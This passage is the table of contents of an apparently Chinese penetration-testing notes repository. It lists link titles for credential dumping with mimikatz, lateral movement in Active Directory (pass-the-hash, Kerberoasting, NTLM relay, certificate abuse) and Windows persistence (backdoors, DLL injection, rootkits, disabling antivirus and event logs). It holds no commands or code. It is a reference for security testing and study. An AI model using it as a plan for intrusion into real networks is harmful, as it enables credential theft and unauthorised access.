    - [绕过卡巴斯基](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/绕过卡巴斯基.md)
    - [Cisco_Jabber转储lsass](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/Cisco_Jabber转储lsass.md)
    - [dotnet2.0](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/dotnet2.0.md)
    - [dotnet4.0Msbuild](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/dotnet4.0Msbuild.md)
    - [Dumpert](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/Dumpert.md)
    - [JScript](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/JScript.md)
    - [mimikatz](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/mimikatz.md)
    - [mimipenguin](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/mimipenguin.md)
    - [横向批量抓HASH操作](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/横向批量抓HASH操作.md)
    - [远程LSASS进程转储-Physmem2profit](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/远程LSASS进程转储-Physmem2profit.md)
    - [Powershell_Bypass](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/Powershell_Bypass.md)
    - [Procdump64+mimikatz](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/Procdump64+mimikatz.md)
    - [调用mimikatz远程抓取](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/调用mimikatz远程抓取.md)
    - [SqlDumper+mimikatz](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/sqldumpermimikatz.md)
  - [域HASH提取](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/README.md)
    - [impacket工具包](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/impacket工具包.md)
    - [mimikatz](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/mimikatz.md)
    - [MSF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/MSF.md)
    - [Nishang脚本](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/Nishang脚本.md)
    - [NTDSDumpex](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/NTDSDumpex.md)
    - [Ntdsutil](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/Ntdsutil.md)
    - [Powersploit](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/Powersploit.md)
    - [Vssadmin](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/Vssadmin.md)
    - [Wmivssadmin](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/Wmivssadmin.md)
    - [esentutl](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/域HASH提取/esentutl.md)
  - [缓存HASH获取](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/缓存HASH获取/README.md)
    - [Ninjacopy](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/缓存HASH获取/Ninjacopy.md)
    - [Quarks-pwdump](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/缓存HASH获取/Quarks-pwdump.md)
    - [注册表](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/缓存HASH获取/注册表.md)
  - [Empire](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/Empire.md)
  - [Invoke-Dcsync](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/Invoke-Dcsync.md)
  - [laZagne](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/laZagne.md)
  - [获取其他密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/README.md)
    - [chrome](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/chrome.md)
    - [firefox](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/firefox.md)
    - [foxmail](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/foxmail.md)
    - [navicat](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/navicat.md)
    - [seatbelt](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/seatbelt.md)
    - [securecrt](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/securecrt.md)
    - [vncpass](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/获取其他密码/vncpass.md)
  - [破解工具](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/破解工具/README.md)
    - [hydra](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/破解工具/hydra.md)
    - [medusa](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/破解工具/medusa.md)


- [横向移动](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/README.md)
  - [添加域管命令](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/添加域管命令.md)
  - [探测存活主机](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/README.md)
    - [For+Ping命令查询存活主机](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/For+Ping命令查询存活主机.md)
    - [MSF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/MSF.md)
    - [NbtScan](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/NbtScan.md)
    - [NetDiscover](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/NetDiscover.md)
    - [NMAP](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/NMAP.md)
    - [rp-scan](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/rp-scan.md)
    - [代理nmap扫描](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/代理nmap扫描.md)
    - [内外网资产对应](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测存活主机/内外网资产对应.md)
  - [探测服务&端口](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/README.md)
    - [CobaltStrike+K8Aggressor](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/CobaltStrike+K8Aggressor.md)
    - [Linux_Samba服务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/Linux_Samba服务.md)
    - [Masscan](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/Masscan.md)
    - [MSF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/MSF.md)
    - [Nc](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/Nc.md)
    - [常见端口](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/常见端口.md)
    - [Powershell](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/Powershell.md)
    - [PTScan](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/PTScan.md)
    - [SMB](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/探测服务&端口/SMB.md)
  - [执行命令&IPC&计划任务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/执行命令&IPC&计划任务/README.md)
    - [AT](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/执行命令&IPC&计划任务/AT.md)
    - [IPC](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/执行命令&IPC&计划任务/IPC.md)
    - [Schtasks](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/执行命令&IPC&计划任务/Schtasks.md)
    - [Wmic](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/执行命令&IPC&计划任务/Wmic.md)
  - [共享](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/共享.md)
  - [快速定位域管理登过的机器](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/快速定位域管理登过的机器.md)
  - [MSF管道监听](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/MSF管道监听.md)
  - [MSF添加路由](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/MSF添加路由.md)
  - [代理](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/README.md)
    - [chisel](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/chisel.md)
    - [earthworm](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/earthworm.md)
    - [frp](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/frp.md)
    - [goproxy](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/goproxy.md)
    - [shadowsocks](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/shadowsocks.md)
    - [sock4a](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/sock4a.md)
    - [socks5](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/socks5.md)
    - [socks5web](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/socks5web.md)
    - [SSF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/ssf.md)
    - [SSH](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/ssh.md)
    - [Gost](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/Gost.md)
    - [revsocks](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/revsocks.md)
    - [GoToHTTP](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/GoToHTTP.md)
    - [RustDesk](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/RustDesk.md)
    - [代理软件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/代理/代理软件.md)
  - [Ngrok内网穿透](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Ngrok内网穿透.md)
  - [MS08_067](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/MS08_067.md)
  - [MS17_010](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/MS17_010.md)
  - [方程式内网不产生session](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/方程式内网不产生session.md)
  - [域内爆破](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/域内爆破.md)
  - [隔离主机payload](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/隔离主机payload.md)
  - [PASS-THE-HASH](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/PASS-THE-HASH.md)
  - [PASS-THE-TICKET](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/PASS-THE-TICKET.md)
  - [PASS-THE-KEY](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/PASS-THE-KEY.md)
  - [ASEPRoasting](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ASEPRoasting.md)
  - [攻击MSSQL数据库](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/攻击MSSQL数据库.md)
  - [攻击MySQL数据库](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/攻击MySQL数据库.md)
  - [账户委派](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/账户委派.md)
  - [kerberos约束委派](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/kerberos约束委派.md)
  - [kerberos无约束委派](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/kerberos无约束委派.md)
  - [kerberos青铜比特攻击CVE-2020-17049](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/kerberos青铜比特攻击CVE-2020-17049.md)
  - [基于kerberos资源的约束委派](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/基于kerberos资源的约束委派.md)
  - [CVE-2019-0708](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/CVE-2019-0708.md)
  - [获取保存的RDP密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/获取保存的RDP密码.md)
  - [GPP-Password](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/GPP-Password.md)
  - [Kerberoasting](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Kerberoasting/README.md)
    - [申请票据](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Kerberoasting/申请票据.md)
    - [破解密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Kerberoasting/破解密码.md)
    - [导出票据](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Kerberoasting/导出票据.md)
    - [SPN发现](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Kerberoasting/SPN发现.md)
    - [GetUserSPNs](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Kerberoasting/GetUserSPNs.md)
    - [重写票据](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/Kerberoasting/重写票据.md)
  - [NTLM中继和中间人攻击](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/README.md)
    - [Ntlmrelayx+资源受限委派](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/Ntlmrelayx+资源受限委派.md)
    - [Responder+LLMNR毒害](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/Responder+LLMNR毒害.md)
    - [捕获和破解Net-NTLMv1和NTLMv1哈希](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/捕获和破解Net-NTLMv1和NTLMv1哈希.md)
    - [CVE-2019-1040](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/CVE-2019-1040.md)
    - [CVE-2019-1384](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/CVE-2019-1384.md)
    - [DNS-Poisonning](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/DNS-Poisonning.md)
    - [MS08-068-NTLM反射](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/MS08-068-NTLM反射.md)
    - [RemotePotato0](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/RemotePotato0.md)
    - [SMB签名禁用和IPv4](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/SMB签名禁用和IPv4.md)
    - [SMB签名禁用和IPv6](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/SMB签名禁用和IPv6.md)
    - [WebDav中继](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/NTLM中继和中间人攻击/WebDav中继.md)
  - [资源受限委派](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/资源受限委派.md)
  - [WinRM无文件执行](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/WinRM无文件执行.md)
  - [组策略对象GPO](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/组策略对象GPO.md)
  - [危险的内置组使用](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/危险的内置组使用.md)
  - [ActiveDirectory证书服务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/README.md)
    - [查找证书服务器](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/查找证书服务器.md)
    - [ESC1-配置错误的证书模板](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/ESC1-配置错误的证书模板.md)
    - [ESC2-配置错误的证书模板](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/ESC2-配置错误的证书模板.md)
    - [ESC3-配置错误的注册代理模板](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/ESC3-配置错误的注册代理模板.md)
    - [ESC4-访问控制漏洞](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/ESC4-访问控制漏洞.md)
    - [ESC6-EDITF_ATTRIBUTESUBJECTALTNAME2](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/ESC6-EDITF_ATTRIBUTESUBJECTALTNAME2.md)
    - [ESC7-易受攻击的证书颁发机构访问控制](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/ESC7-易受攻击的证书颁发机构访问控制.md)
    - [ESC8-ADCS中继攻击](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/ESC8-ADCS中继攻击.md)
    - [经过认证的CVE-2022-26923](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/经过认证的CVE-2022-26923.md)
    - [Pass-The-Certificate](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory证书服务/Pass-The-Certificate.md)
  - [ActiveDirectory的ACL和ACE](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/README.md)
    - [GenericAll](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/GenericAll.md)
    - [GenericWrite](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/GenericWrite.md)
    - [WriteDACL](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/WriteDACL.md)
    - [WriteOwner](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/WriteOwner.md)
    - [读取GMSA密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/读取GMSA密码.md)
    - [读取LAPS密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/读取LAPS密码.md)
    - [强制更改密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/ActiveDirectory的ACL和ACE/强制更改密码.md)
  - [DCOM-Exploitation](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/DCOM-Exploitation/README.md)
    - [DCOM](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/DCOM-Exploitation/DCOM.md)
    - [通过MMC应用程序类进行DCOM](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/DCOM-Exploitation/通过MMC应用程序类进行DCOM.md)
    - [通过Office进行DCOM](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/DCOM-Exploitation/通过Office进行DCOM.md)
    - [通过ShellExecute进行DCOM](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/DCOM-Exploitation/通过ShellExecute进行DCOM.md)
    - [通过ShellBrowserWindow进行DCOM](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/DCOM-Exploitation/通过ShellBrowserWindow进行DCOM.md)
  - [域与域](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/域与域.md)
  - [SCCM部署](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/SCCM部署.md)
  - [WSUS部署](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/WSUS部署.md)
  - [PrivExchange攻击](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/PrivExchange攻击.md)
  - [RODC-只读域控制器入侵](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/RODC-只读域控制器入侵.md)
  - [PXE启动映像攻击](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/横向移动/PXE启动映像攻击.md)
- [权限维持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/README.md)
  - [Windows](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/README.md)
    - [关闭防病毒软件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/关闭防病毒软件.md)
    - [启动文件夹](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/启动文件夹.md)
    - [Invoke-ADSBackdoor](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Invoke-ADSBackdoor.md)
    - [ADS隐藏webshell](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/ADS隐藏webshell.md)
    - [ADS&JavaScript](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/ADS&JavaScript.md)
    - [使用AMSI扫描接口维持权限](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/使用AMSI扫描接口维持权限.md)
    - [Bitadmin](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Bitadmin.md)
    - [CLR Injection](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/CLR-Injection.md)
    - [COM OBJECT hijacking](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/COM-OBJECT-hijacking.md)
    - [受限委派后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/受限委派后门.md)
    - [通过控制面板加载项维持权限](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/通过控制面板加载项维持权限.md)
    - [创建服务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/创建服务.md)
    - [DCShadow&SIDHistory](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/DCShadow&SIDHistory.md)
    - [DCSync后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/DCSync后门.md)
    - [DLL劫持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/DLL劫持.md)
    - [DLL注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/DLL注入.md)
    - [DLL代理劫持右键](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/DLL代理劫持右键.md)
    - [DLL劫持计划任务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/DLL劫持计划任务.md)
    - [通过自定义.net垃圾回收机制进行DLL注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/通过自定义.net垃圾回收机制进行DLL注入.md)
    - [DSRM+注册表ACL后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/DSRM+注册表ACL后门.md)
    - [Empire](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Empire.md)
    - [Windows FAX DLL Injection](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Windows-FAX-DLL-Injection.md)
    - [Guest激活](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Guest激活.md)
    - [映像劫持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/映像劫持.md)
    - [HookPasswordChangeNotify](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/HookPasswordChangeNotify.md)
    - [Kerberoasting后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Kerberoasting后门.md)
    - [登录初始化](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/登录初始化.md)
    - [Metsvc](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Metsvc.md)
    - [MOF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/MOF.md)
    - [MSSQL后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/MSSQL后门.md)
    - [Netsh Helper DLL](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Netsh-Helper-DLL.md)
    - [NPPSpy记录密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/NPPSpy记录密码.md)
    - [NSSM](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/NSSM.md)
    - [唯一IP访问](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/唯一IP访问.md)
    - [Password Filter DLL](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Password-Filter-DLL.md)
    - [Persistence](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Persistence.md)
    - [基于域策略文件权限后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/基于域策略文件权限后门.md)
    - [进程注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/进程注入.md)
    - [Invoke-Tasks权限维持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Invoke-Tasks权限维持.md)
    - [WMI-Persistence](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/WMI-Persistence.md)
    - [RID劫持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/RID劫持.md)
    - [rootkit](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/rootkit.md)
    - [S4U2Self后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/S4U2Self后门.md)
    - [计划任务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/计划任务.md)
    - [影子用户](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/影子用户.md)
    - [添加签名](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/添加签名.md)
    - [Skeleton Key万能钥匙](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Skeleton-Key万能钥匙.md)
    - [Squibledoo](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Squibledoo.md)
    - [注入SSP被动收集密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/注入SSP被动收集密码.md)
    - [WinRM端口复用](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/WinRM端口复用.md)
    - [WMIC事件订阅](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/WMIC事件订阅.md)
    - [RPC后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/RPC后门.md)
    - [Shadow-Credentials](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/Shadow-Credentials.md)
    - [动态调用进程注入逻辑](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/动态调用进程注入逻辑.md)
    - [通过挂起EventLog服务线程禁用Windows事件日志](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/通过挂起EventLog服务线程禁用Windows事件日志.md)
    - [隐藏windows服务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/隐藏windows服务.md)
    - [ImportDLLInjection-通过修改内存中的PE头来注入DLL的另一种方法](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/ImportDLLInjection-通过修改内存中的PE头来注入DLL的另一种方法.md)
    - [父进程破坏](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/父进程破坏.md)
    - [进程挖空(MitreT1055.012)](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Windows/进程挖空(MitreT1055.012).md)
